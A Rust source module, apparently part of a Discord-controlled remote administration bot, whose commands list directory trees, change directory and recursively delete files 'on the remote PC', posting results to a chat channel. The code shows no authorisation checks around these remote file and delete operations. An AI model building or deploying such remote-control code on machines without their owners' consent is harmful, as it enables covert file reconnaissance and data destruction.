use std::{io::{BufWriter, Write}, fs::{File, self}, path::Path, collections::HashSet};
use rand::distributions::{Alphanumeric, DistString};
use serde_json::json;
use std::sync::Mutex;
use crate::BOT_TO_SEND;
pub async fn main(channel_id: u64, user: String) {
    let dir= std::env::current_dir().unwrap();
    let treeb= list_directory(dir).unwrap();
    if treeb.len()< 4090 {
        BOT_TO_SEND.lock().await.push(json!({
            "channel": channel_id,
            "content": &format!("```Directory tree requested by {}\n\n{}```", user, std::env::current_dir().unwrap().to_string_lossy()),
            "embed": true,
            "title": "Directory tree",
            "description": format!("```{}```", treeb),
            "react": ["🔴"]
        }));
    }else{
        let path= format!("{}/{}.txt", std::env::temp_dir().to_string_lossy(), &Alphanumeric.sample_string(&mut rand::thread_rng(), 12));
        let mut f= BufWriter::new(File::create(&path).unwrap());
        f.write_all(treeb.as_bytes()).unwrap();
        f.flush().unwrap();
        drop(f);
        BOT_TO_SEND.lock().await.push(json!({
            "channel": channel_id,
            "content": &format!("```Directory tree requested by {}\n\n{}```", user, std::env::current_dir().unwrap().to_string_lossy()),
            "files": [path],
            "react": ["🔴"],
            "delete_files": true
        }));
    }
}
pub async fn main_ls(channel_id: u64, user: String) {
    let dir= std::env::current_dir().unwrap();
    let lsb= list_directory_one(dir).unwrap();
    if lsb.len()< 4090 {
        BOT_TO_SEND.lock().await.push(json!({
            "channel": channel_id,
            "content": &format!("```Directory ls requested by {}\n\n{}```", user, std::env::current_dir().unwrap().to_string_lossy()),
            "embed": true,
            "title": "Directory ls",
            "description": format!("```{}```", lsb),
            "react": ["🔴"]
        }));
    }else{
        let path= format!("{}/{}.txt", std::env::temp_dir().to_string_lossy(), &Alphanumeric.sample_string(&mut rand::thread_rng(), 12));
        let mut f= BufWriter::new(File::create(&path).unwrap());
        f.write_all(lsb.as_bytes()).unwrap();
        f.flush().unwrap();
        drop(f);
        BOT_TO_SEND.lock().await.push(json!({
            "channel": channel_id,
            "content": &format!("```Directory ls requested by {}\n\n{}```", user, std::env::current_dir().unwrap().to_string_lossy()),
            "files": [path],
            "react": ["🔴"],
            "delete_files": true
        }));
    }
}
pub async fn main_cd(channel_id: u64, user: String, input: String) {
    let mut not_found= true;
    let path= Path::new(input.trim());
    if path.is_dir() && std::env::set_current_dir(path).is_ok() {
        not_found= false;
    }
    if not_found {
        BOT_TO_SEND.lock().await.push(json!({
            "channel": channel_id,
            "content": &"```❗ Directory not found!```".to_string(),
            "react": ["🔴"]
        }));
    }else{
        BOT_TO_SEND.lock().await.push(json!({
            "channel": channel_id,
            "content": &format!("```You are now in: {}\n\nRequested by {}```", std::env::current_dir().unwrap().to_string_lossy(), user),
            "react": ["🔴"]
        }));
    }
}
pub async fn main_remove(channel_id: u64, user: String, input: String) {
    let mut path= std::env::current_dir().unwrap();
    path.push(input.trim());
    let mut show_err= true;
    if path.exists() {
        if path.is_file() {
            show_err= false;
            match fs::remove_file(&path) {
                Ok(_) => {
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": channel_id,
                        "content": &format!("```Removed \"{}\" by {} on the remote PC```", path.to_string_lossy(), user),
                        "react": ["🔴"]
                    }));
                }
                Err(_) => {
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": channel_id,
                        "content": &format!("```❗ Unable to remove \"{}\" on the remote PC```", path.to_string_lossy()),
                        "react": ["🔴"]
                    }));
                }
            }
        }
        if path.is_dir() {
            show_err= false;
            match fs::remove_dir_all(&path) {
                Ok(_) => {
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": channel_id,
                        "content": &format!("```Removed \"{}\" by {} on the remote PC```", path.to_string_lossy(), user),
                        "react": ["🔴"]
                    }));
                }
                Err(_) => {
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": channel_id,
                        "content": &format!("```❗ Unable to remove \"{}\" on the remote PC```", path.to_string_lossy()),
                        "react": ["🔴"]
                    }));
                }
            }
        }
    }
    if show_err {
        BOT_TO_SEND.lock().await.push(json!({
            "channel": channel_id,
            "content": &"```❗ File not found```".to_string(),
            "react": ["🔴"]
        }));
    }
}
pub fn traverse_directory<P: AsRef<Path>>(treeb: &mut Mutex<String>, root_path: P, current_path: &Path, depth: usize, last_entry_depths: &mut HashSet<usize>) -> std::io::Result<()> {
    match fs::read_dir(current_path) {
        Ok(pre) => {
            let mut entries: Vec<_>= pre.collect();
            entries.sort_by_key(|entry| {
                match entry.as_ref() {
                    Ok(e) => {
                        e.file_name()
                    }
                    Err(_) => {
                        "Unknown".into()
                    }
                }
            });
            let last_index= entries.len().saturating_sub(1);
            for (index, entry) in entries.into_iter().enumerate() {
                if let Ok(entry)= entry {
                    let path= entry.path();
                    let is_entry_last= index== last_index;
                    for i in 0..depth {
                        if last_entry_depths.contains(&i) {
                            *treeb.get_mut().unwrap()+= "    ";
                        }else{
                            *treeb.get_mut().unwrap()+= "│   ";
                        }
                    }
                    let prefix= if is_entry_last {"└── "}else{"├── "};
                    let name= entry.file_name().to_string_lossy().to_string();
                    *treeb.get_mut().unwrap()+= &(prefix.to_string() + &name);
                    match entry.file_type() {
                        Ok(kind) => {
                            if kind.is_dir() {
                                *treeb.get_mut().unwrap()+= "\n";
                                if is_entry_last {
                                    last_entry_depths.insert(depth);
                                }
                                traverse_directory(treeb, root_path.as_ref(), &path, depth + 1, last_entry_depths)?;
                                if is_entry_last {
                                    last_entry_depths.remove(&depth);
                                }
                            }else{
                                *treeb.get_mut().unwrap()+= "\n";
                            }
                        }
                        Err(_) => {
                            *treeb.get_mut().unwrap()+= "\n";
                        }
                    }
                }
            }
            Ok(())
        }
        Err(_) => Ok(())
    }
}
pub fn list_directory<P: AsRef<Path>>(path: P) -> std::io::Result<String> {
    let mut treeb= Mutex::new(String::new());
    let current_path= path.as_ref();
    *treeb.lock().unwrap()+= &format!("{}\n", current_path.display());
    let mut last_entry_depths= HashSet::new();
    traverse_directory(&mut treeb, current_path,current_path, 0, &mut last_entry_depths)?;
    let finalt= treeb.lock().unwrap().clone();
    Ok(finalt)
}
pub fn traverse_directory_one(treeb: &mut Mutex<String>, current_path: &Path, depth: usize, last_entry_depths: &mut HashSet<usize>) -> std::io::Result<()> {
    match fs::read_dir(current_path) {
        Ok(pre) => {
            let mut entries: Vec<_>= pre.collect();
            entries.sort_by_key(|entry| {
                match entry.as_ref() {
                    Ok(e) => {
                        e.file_name()
                    }
                    Err(_) => {
                        "Unknown".into()
                    }
                }
            });
            let last_index= entries.len().saturating_sub(1);
            for (index, entry) in entries.into_iter().enumerate() {
                if let Ok(entry)= entry {
                    let is_entry_last= index== last_index;
                    for i in 0..depth {
                        if last_entry_depths.contains(&i) {
                            *treeb.get_mut().unwrap()+= "    ";
                        }else{
                            *treeb.get_mut().unwrap()+= "│   ";
                        }
                    }
                    let prefix= if is_entry_last {"└── "}else{"├── "};
                    let name= entry.file_name().to_string_lossy().to_string();
                    *treeb.get_mut().unwrap()+= &(prefix.to_string() + &name);
                    match entry.file_type() {
                        Ok(kind) => {
                            if kind.is_dir() {
                                *treeb.get_mut().unwrap()+= "  <DIR>";
                            }else if kind.is_file() {
                                let mut size= 0;
                                if let Ok(meta)= entry.metadata() {
                                    size= meta.len();
                                }
                                let mut csize= size as f64;
                                let mut ssize= "B";
                                while csize> 1000. {
                                    csize/= 1024.;
                                    ssize= match ssize {"B" => "KiB", "KiB" => "MiB", "MiB" => "GiB", "GiB" => "TiB", _ => "???"};
                                }
                                *treeb.get_mut().unwrap()+= &format!("  {:.2} {}", csize, ssize);
                            }
                            *treeb.get_mut().unwrap()+= "\n";
                        }
                        Err(_) => {
                            *treeb.get_mut().unwrap()+= "\n";
                        }
                    }
                }
            }
            Ok(())
        }
        Err(_) => Ok(())
    }
}
pub fn list_directory_one<P: AsRef<Path>>(path: P) -> std::io::Result<String> {
    let mut treeb= Mutex::new(String::new());
    let current_path= path.as_ref();
    *treeb.lock().unwrap()+= &format!("{}\n", current_path.display());
    let mut last_entry_depths= HashSet::new();
    traverse_directory_one(&mut treeb, current_path, 0, &mut last_entry_depths)?;
    let finalt= treeb.lock().unwrap().clone();
    Ok(finalt)
}